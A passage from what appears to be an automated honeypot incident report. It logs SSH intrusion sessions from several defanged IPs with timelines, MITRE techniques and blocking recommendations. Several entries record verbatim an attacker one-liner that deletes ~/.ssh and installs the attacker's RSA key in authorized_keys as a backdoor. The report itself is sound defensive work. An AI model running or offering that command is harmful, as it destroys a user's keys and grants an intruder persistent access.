| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:48:58` | `cowrie.session.connect` |
| `2026-06-02 22:48:58` | `cowrie.client.version` |
| `2026-06-02 22:48:58` | `cowrie.client.kex` |
| `2026-06-02 22:48:58` | `cowrie.login.success` |
| `2026-06-02 22:48:59` | `cowrie.session.params` |
| `2026-06-02 22:48:59` | `cowrie.command.input` |
| `2026-06-02 22:48:59` | `cowrie.command.failed` |
| `2026-06-02 22:48:59` | `cowrie.log.closed` |
| `2026-06-02 22:48:59` | `cowrie.session.params` |
| `2026-06-02 22:48:59` | `cowrie.command.input` |
| `2026-06-02 22:48:59` | `cowrie.session.file_download` |
| `2026-06-02 22:48:59` | `cowrie.log.closed` |
| `2026-06-02 22:49:13` | `cowrie.session.params` |
| `2026-06-02 22:49:13` | `cowrie.command.input` |
| `2026-06-02 22:49:13` | `cowrie.log.closed` |
| `2026-06-02 22:49:13` | `cowrie.session.params` |
| `2026-06-02 22:49:13` | `cowrie.command.input` |
| `2026-06-02 22:49:13` | `cowrie.log.closed` |
| `2026-06-02 22:49:14` | `cowrie.session.params` |
| `2026-06-02 22:49:14` | `cowrie.command.input` |
| `2026-06-02 22:49:14` | `cowrie.session.file_download` |
| `2026-06-02 22:49:14` | `cowrie.log.closed` |
| `2026-06-02 22:49:14` | `cowrie.session.params` |
| `2026-06-02 22:49:14` | `cowrie.command.input` |
| `2026-06-02 22:49:14` | `cowrie.log.closed` |
| `2026-06-02 22:49:15` | `cowrie.session.params` |
| `2026-06-02 22:49:15` | `cowrie.command.input` |
| `2026-06-02 22:49:15` | `cowrie.log.closed` |
| `2026-06-02 22:49:15` | `cowrie.session.params` |
| `2026-06-02 22:49:15` | `cowrie.command.input` |
| `2026-06-02 22:49:15` | `cowrie.command.input` |
| `2026-06-02 22:49:15` | `cowrie.log.closed` |
| `2026-06-02 22:49:16` | `cowrie.session.params` |
| `2026-06-02 22:49:16` | `cowrie.command.input` |
| `2026-06-02 22:49:16` | `cowrie.log.closed` |
| `2026-06-02 22:49:16` | `cowrie.session.params` |
| `2026-06-02 22:49:16` | `cowrie.command.input` |
| `2026-06-02 22:49:16` | `cowrie.log.closed` |
| `2026-06-02 22:49:17` | `cowrie.session.params` |
| `2026-06-02 22:49:17` | `cowrie.command.input` |
| `2026-06-02 22:49:17` | `cowrie.log.closed` |
| `2026-06-02 22:49:17` | `cowrie.session.params` |
| `2026-06-02 22:49:17` | `cowrie.command.input` |
| `2026-06-02 22:49:17` | `cowrie.log.closed` |
| `2026-06-02 22:49:17` | `cowrie.session.params` |
| `2026-06-02 22:49:17` | `cowrie.command.input` |
| `2026-06-02 22:49:18` | `cowrie.log.closed` |
| `2026-06-02 22:49:18` | `cowrie.session.params` |
| `2026-06-02 22:49:18` | `cowrie.command.input` |
| `2026-06-02 22:49:18` | `cowrie.log.closed` |
| `2026-06-02 22:49:19` | `cowrie.session.params` |
| `2026-06-02 22:49:19` | `cowrie.command.input` |
| `2026-06-02 22:49:19` | `cowrie.log.closed` |
| `2026-06-02 22:49:19` | `cowrie.session.params` |
| `2026-06-02 22:49:19` | `cowrie.command.input` |
| `2026-06-02 22:49:19` | `cowrie.log.closed` |
| `2026-06-02 22:49:19` | `cowrie.session.params` |
| `2026-06-02 22:49:19` | `cowrie.command.input` |
| `2026-06-02 22:49:20` | `cowrie.log.closed` |
| `2026-06-02 22:49:20` | `cowrie.session.params` |
| `2026-06-02 22:49:20` | `cowrie.command.input` |
| `2026-06-02 22:49:20` | `cowrie.log.closed` |
| `2026-06-02 22:49:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.64.168[.]136` to AbuseIPDB if not already reported
- [ ] Block `143.64.168[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-866c5214e670

| Field | Detail |
|---|---|
| **Source IP** | `87.106.29[.]151` |
| **First Seen** | 2026-06-02 22:50 |
| **Last Seen** | 2026-06-02 22:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:50:10` | `cowrie.session.connect` |
| `2026-06-02 22:50:10` | `cowrie.client.version` |
| `2026-06-02 22:50:11` | `cowrie.client.kex` |
| `2026-06-02 22:50:11` | `cowrie.login.success` |
| `2026-06-02 22:50:11` | `cowrie.session.params` |
| `2026-06-02 22:50:11` | `cowrie.command.input` |
| `2026-06-02 22:50:11` | `cowrie.command.failed` |
| `2026-06-02 22:50:12` | `cowrie.log.closed` |
| `2026-06-02 22:50:12` | `cowrie.session.params` |
| `2026-06-02 22:50:12` | `cowrie.command.input` |
| `2026-06-02 22:50:12` | `cowrie.session.file_download` |
| `2026-06-02 22:50:12` | `cowrie.log.closed` |
| `2026-06-02 22:50:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.29[.]151` to AbuseIPDB if not already reported
- [ ] Block `87.106.29[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e88044eb3e9b

| Field | Detail |
|---|---|
| **Source IP** | `87.106.29[.]151` |
| **First Seen** | 2026-06-02 22:50 |
| **Last Seen** | 2026-06-02 22:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:50:14` | `cowrie.session.connect` |
| `2026-06-02 22:50:14` | `cowrie.client.version` |
| `2026-06-02 22:50:14` | `cowrie.client.kex` |
| `2026-06-02 22:50:15` | `cowrie.login.success` |
| `2026-06-02 22:50:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.29[.]151` to AbuseIPDB if not already reported
- [ ] Block `87.106.29[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbe976ea2df4

| Field | Detail |
|---|---|
| **Source IP** | `86.98.113[.]226` |
| **First Seen** | 2026-06-02 22:51 |
| **Last Seen** | 2026-06-02 22:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:51:49` | `cowrie.session.connect` |
| `2026-06-02 22:51:49` | `cowrie.client.version` |
| `2026-06-02 22:51:49` | `cowrie.client.kex` |
| `2026-06-02 22:51:49` | `cowrie.login.success` |
| `2026-06-02 22:51:49` | `cowrie.session.params` |
| `2026-06-02 22:51:49` | `cowrie.command.input` |
| `2026-06-02 22:51:49` | `cowrie.command.failed` |
| `2026-06-02 22:51:49` | `cowrie.log.closed` |
| `2026-06-02 22:51:49` | `cowrie.session.params` |
| `2026-06-02 22:51:49` | `cowrie.command.input` |
| `2026-06-02 22:51:49` | `cowrie.session.file_download` |
| `2026-06-02 22:51:49` | `cowrie.log.closed` |
| `2026-06-02 22:51:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.98.113[.]226` to AbuseIPDB if not already reported
- [ ] Block `86.98.113[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79578fde91b3

| Field | Detail |
|---|---|
| **Source IP** | `86.98.113[.]226` |
| **First Seen** | 2026-06-02 22:51 |
| **Last Seen** | 2026-06-02 22:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:51:50` | `cowrie.session.connect` |
| `2026-06-02 22:51:50` | `cowrie.client.version` |
| `2026-06-02 22:51:51` | `cowrie.client.kex` |
| `2026-06-02 22:51:51` | `cowrie.login.success` |
| `2026-06-02 22:51:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.98.113[.]226` to AbuseIPDB if not already reported
- [ ] Block `86.98.113[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42f49fb08b7c

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-02 22:51 |
| **Last Seen** | 2026-06-02 22:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:51:56` | `cowrie.session.connect` |
| `2026-06-02 22:51:56` | `cowrie.client.version` |
| `2026-06-02 22:51:56` | `cowrie.client.kex` |
| `2026-06-02 22:51:57` | `cowrie.login.success` |
| `2026-06-02 22:51:57` | `cowrie.session.params` |
| `2026-06-02 22:51:57` | `cowrie.command.input` |
| `2026-06-02 22:51:57` | `cowrie.command.failed` |
| `2026-06-02 22:51:58` | `cowrie.log.closed` |
| `2026-06-02 22:51:58` | `cowrie.session.params` |
| `2026-06-02 22:51:58` | `cowrie.command.input` |
| `2026-06-02 22:51:58` | `cowrie.session.file_download` |
| `2026-06-02 22:51:58` | `cowrie.log.closed` |
| `2026-06-02 22:52:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-affb8684211f

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-02 22:52 |
| **Last Seen** | 2026-06-02 22:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:52:00` | `cowrie.session.connect` |
| `2026-06-02 22:52:00` | `cowrie.client.version` |
| `2026-06-02 22:52:01` | `cowrie.client.kex` |
| `2026-06-02 22:52:01` | `cowrie.login.success` |
| `2026-06-02 22:52:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bcccd74459c

| Field | Detail |
|---|---|
| **Source IP** | `103.171.69[.]82` |
| **First Seen** | 2026-06-02 22:52 |
| **Last Seen** | 2026-06-02 22:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:52:47` | `cowrie.session.connect` |
| `2026-06-02 22:52:47` | `cowrie.client.version` |
| `2026-06-02 22:52:47` | `cowrie.client.kex` |
| `2026-06-02 22:52:47` | `cowrie.login.success` |
| `2026-06-02 22:52:47` | `cowrie.session.params` |
| `2026-06-02 22:52:47` | `cowrie.command.input` |
| `2026-06-02 22:52:47` | `cowrie.command.failed` |
| `2026-06-02 22:52:47` | `cowrie.log.closed` |
| `2026-06-02 22:52:47` | `cowrie.session.params` |
| `2026-06-02 22:52:47` | `cowrie.command.input` |
| `2026-06-02 22:52:47` | `cowrie.session.file_download` |
| `2026-06-02 22:52:47` | `cowrie.log.closed` |
| `2026-06-02 22:52:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.69[.]82` to AbuseIPDB if not already reported
- [ ] Block `103.171.69[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d021f9623176

| Field | Detail |
|---|---|
| **Source IP** | `103.171.69[.]83` |
| **First Seen** | 2026-06-02 22:52 |
| **Last Seen** | 2026-06-02 22:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:52:49` | `cowrie.session.connect` |
| `2026-06-02 22:52:49` | `cowrie.client.version` |
| `2026-06-02 22:52:49` | `cowrie.client.kex` |
| `2026-06-02 22:52:49` | `cowrie.login.success` |
| `2026-06-02 22:52:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.69[.]83` to AbuseIPDB if not already reported
- [ ] Block `103.171.69[.]83` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4f1234347e0

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-02 22:53 |
| **Last Seen** | 2026-06-02 22:53 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:53:32` | `cowrie.session.connect` |
| `2026-06-02 22:53:32` | `cowrie.client.version` |
| `2026-06-02 22:53:32` | `cowrie.client.kex` |
| `2026-06-02 22:53:33` | `cowrie.login.success` |
| `2026-06-02 22:53:33` | `cowrie.session.params` |
| `2026-06-02 22:53:33` | `cowrie.command.input` |
| `2026-06-02 22:53:33` | `cowrie.command.failed` |
| `2026-06-02 22:53:33` | `cowrie.log.closed` |
| `2026-06-02 22:53:34` | `cowrie.session.params` |
| `2026-06-02 22:53:34` | `cowrie.command.input` |
| `2026-06-02 22:53:34` | `cowrie.session.file_download` |
| `2026-06-02 22:53:34` | `cowrie.log.closed` |
| `2026-06-02 22:53:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed76b0d1a89c

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-02 22:53 |
| **Last Seen** | 2026-06-02 22:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:53:36` | `cowrie.session.connect` |
| `2026-06-02 22:53:36` | `cowrie.client.version` |
| `2026-06-02 22:53:36` | `cowrie.client.kex` |
| `2026-06-02 22:53:37` | `cowrie.login.success` |
| `2026-06-02 22:53:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bce6b768a1c

| Field | Detail |
|---|---|
| **Source IP** | `103.171.69[.]82` |
| **First Seen** | 2026-06-02 22:54 |
| **Last Seen** | 2026-06-02 22:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:54:55` | `cowrie.session.connect` |
| `2026-06-02 22:54:55` | `cowrie.client.version` |
| `2026-06-02 22:54:55` | `cowrie.client.kex` |
| `2026-06-02 22:54:56` | `cowrie.login.success` |
| `2026-06-02 22:54:56` | `cowrie.session.params` |
| `2026-06-02 22:54:56` | `cowrie.command.input` |
| `2026-06-02 22:54:56` | `cowrie.command.failed` |
| `2026-06-02 22:54:56` | `cowrie.log.closed` |
| `2026-06-02 22:54:56` | `cowrie.session.params` |
| `2026-06-02 22:54:56` | `cowrie.command.input` |
| `2026-06-02 22:54:56` | `cowrie.session.file_download` |
| `2026-06-02 22:54:56` | `cowrie.log.closed` |
| `2026-06-02 22:54:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.69[.]82` to AbuseIPDB if not already reported
- [ ] Block `103.171.69[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27923ff0ef6b

| Field | Detail |
|---|---|
| **Source IP** | `103.171.69[.]66` |
| **First Seen** | 2026-06-02 22:54 |
| **Last Seen** | 2026-06-02 22:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:54:57` | `cowrie.session.connect` |
| `2026-06-02 22:54:57` | `cowrie.client.version` |
| `2026-06-02 22:54:57` | `cowrie.client.kex` |
| `2026-06-02 22:54:58` | `cowrie.login.success` |
| `2026-06-02 22:54:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.69[.]66` to AbuseIPDB if not already reported
- [ ] Block `103.171.69[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21db9b2487ff

| Field | Detail |
|---|---|
| **Source IP** | `87.106.29[.]151` |
| **First Seen** | 2026-06-02 22:55 |
| **Last Seen** | 2026-06-02 22:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:55:00` | `cowrie.session.connect` |
| `2026-06-02 22:55:00` | `cowrie.client.version` |
| `2026-06-02 22:55:00` | `cowrie.client.kex` |
| `2026-06-02 22:55:01` | `cowrie.login.success` |
| `2026-06-02 22:55:01` | `cowrie.session.params` |
| `2026-06-02 22:55:01` | `cowrie.command.input` |
| `2026-06-02 22:55:01` | `cowrie.command.failed` |
| `2026-06-02 22:55:01` | `cowrie.log.closed` |
| `2026-06-02 22:55:02` | `cowrie.session.params` |
| `2026-06-02 22:55:02` | `cowrie.command.input` |
| `2026-06-02 22:55:02` | `cowrie.session.file_download` |
| `2026-06-02 22:55:02` | `cowrie.log.closed` |
| `2026-06-02 22:55:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.29[.]151` to AbuseIPDB if not already reported
- [ ] Block `87.106.29[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2d49e0aadb3

| Field | Detail |
|---|---|
| **Source IP** | `87.106.29[.]151` |
| **First Seen** | 2026-06-02 22:55 |
| **Last Seen** | 2026-06-02 22:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:55:04` | `cowrie.session.connect` |
| `2026-06-02 22:55:04` | `cowrie.client.version` |
| `2026-06-02 22:55:04` | `cowrie.client.kex` |
| `2026-06-02 22:55:05` | `cowrie.login.success` |
| `2026-06-02 22:55:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.29[.]151` to AbuseIPDB if not already reported
- [ ] Block `87.106.29[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29ae0f505b82

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-02 22:55 |
| **Last Seen** | 2026-06-02 22:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
